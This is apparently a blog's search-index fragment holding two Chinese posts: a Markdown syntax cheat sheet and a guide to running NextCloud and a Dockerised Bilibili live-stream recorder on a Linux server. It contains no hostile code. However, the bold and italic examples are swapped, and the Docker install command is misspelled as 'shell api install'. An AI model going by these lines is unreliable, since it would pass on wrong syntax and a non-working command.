      <title>Markdown写作语法</title>
      <link href="/2021/08/22/markdown-xie-zuo-yu-fa/"/>
      <url>/2021/08/22/markdown-xie-zuo-yu-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="官方具体说明"><a href="#官方具体说明" class="headerlink" title="官方具体说明"></a><a href="https://markdown.com.cn/">官方具体说明</a></h2><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 一级标题</span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment"># 二级标题</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">## 三级标题</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">### 四级标题</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">#### 五级标题</span></span><br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">##### 六级标题</span></span><br></code></pre></td></tr></tbody></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">无序列表</span><br>- 列表1<br>     -列表1.1<br>     -列表1.2<br>- 列表2<br>- 列表3<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">有序列表</span><br>1. 列表1<br>      1. 列表1.1<br>      2. 列表1.2<br>2. 列表2<br>3. 列表3<br></code></pre></td></tr></tbody></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">&gt;</span><span class="bash"> 有三件事人类都要经历：出生、生活和死亡</span><br></code></pre></td></tr></tbody></table></figure><h2 id="粗体"><a href="#粗体" class="headerlink" title="粗体"></a>粗体</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">*这是粗体*<br></code></pre></td></tr></tbody></table></figure><h2 id="斜体"><a href="#斜体" class="headerlink" title="斜体"></a>斜体</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">**这是斜体**<br></code></pre></td></tr></tbody></table></figure><h2 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">![描述](图片链接)<br></code></pre></td></tr></tbody></table></figure><h2 id="插入链接"><a href="#插入链接" class="headerlink" title="插入链接"></a>插入链接</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[描述](链接)<br></code></pre></td></tr></tbody></table></figure><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">内容1</span><br>***<br><span class="hljs-meta">#</span><span class="bash">内容2</span><br></code></pre></td></tr></tbody></table></figure><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><figure class="highlight gherkin"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">|<span class="hljs-string">表头   </span>|<span class="hljs-string">表头   </span>|<span class="hljs-string">表头QT</span>|<br>|<span class="hljs-string">-------</span>|<span class="hljs-string">-------</span>|<span class="hljs-string">------</span>|<br>|<span class="hljs-string">单元格 </span>|<span class="hljs-string">单元格 </span>|<span class="hljs-string">单元格</span>|<br>|<span class="hljs-string">单元格 </span>|<span class="hljs-string">单元格 </span>|<span class="hljs-string">单元格</span>|<br></code></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 写作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>搭建个人网盘+24小时B站录播姬</title>
      <link href="/2021/08/20/da-jian-ge-ren-wang-pan-24-xiao-shi-lu-bo-ji/"/>
      <url>/2021/08/20/da-jian-ge-ren-wang-pan-24-xiao-shi-lu-bo-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="准备事项"><a href="#准备事项" class="headerlink" title="准备事项"></a>准备事项</h2><ul><li>一台Linux服务器           </li><li>Docker版B站录播姬</li><li>Snap         </li><li>Docker          </li><li>NextCloud<h2 id="安装NextCloud和Snap"><a href="#安装NextCloud和Snap" class="headerlink" title="安装NextCloud和Snap"></a>安装NextCloud和Snap</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">进入root用户</span><br>sudo -i<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">更新软件库</span><br>apt update <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">安装snap</span><br>apt install snapd <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">安装nextcloud</span><br>snap install nextcloud <br></code></pre></td></tr></tbody></table></figure>这里用的是很简单的安装方法，但是个人不建议用这个方法，最后用ip进行访问。<h2 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">shell api install docker.io<br></code></pre></td></tr></tbody></table></figure><h2 id="安装Docker版b站录播姬并且部署"><a href="#安装Docker版b站录播姬并且部署" class="headerlink" title="安装Docker版b站录播姬并且部署"></a>安装Docker版b站录播姬并且部署</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">切换root账户</span><br>sudo -i <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">拉取Docker版b站录播姬</span><br>docker pull ghcr.io/bililive/bililiverecorder:latest<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">第一次运行后存放位置会多出一个配置文件名为config.json</span><br>docker run -d --name recorder -v /存放位置/rec:/rec ghcr.io/bililive/bililiverecorder:latest run /rec<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">编辑配置文件</span><br>cd ~/存放位置<br>nano config.json<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">修改好配置文件后重启一次容器</span><br>docker restart recorder<br></code></pre></td></tr></tbody></table></figure>具体配置请参考官方说明<a href="https://github.com/Bililive/BililiveRecorder/blob/e33fa33b04331e00c4c020966d4af403bd5caf26/BililiveRecorder.Core/Config/V2/build_config.data.js">https://github.com/Bililive/BililiveRecorder/blob/e33fa33b04331e00c4c020966d4af403bd5caf26/BililiveRecorder.Core/Config/V2/build_config.data.js</a><h2 id="Docker版b站录播姬使用"><a href="#Docker版b站录播姬使用" class="headerlink" title="Docker版b站录播姬使用"></a>Docker版b站录播姬使用</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 标准（使用配置文件）模式运行</span><br>docker run -d --name recorder -v /存放位置/rec:/rec ghcr.io/bililive/bililiverecorder:latest run /rec<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 无配置文件模式运行</span><br>docker run -d --name recorder -v /存放位置/rec:/rec ghcr.io/bililive/bililiverecorder:latest portable /rec 1 2 3 4 5<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 使用工具箱分析录播文件并以 json 格式输出到 stdout</span><br>docker run -it --rm -v /存放位置/rec:/rec ghcr.io/bililive/bililiverecorder:latest tool analyze "/rec/recording.flv" --json<br></code></pre></td></tr></tbody></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2>这个方法能做私有网盘同时自行录制各个直播间，很适合各位切片妈和up主，这样就不用怕忘记录播了。<br>还有另外一个部署方法参考下面的链接。</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><img src="https://www.bilibili.com/read/cv15606087/" alt="https://www.bilibili.com/read/cv15606087/"></p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nextcloud </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
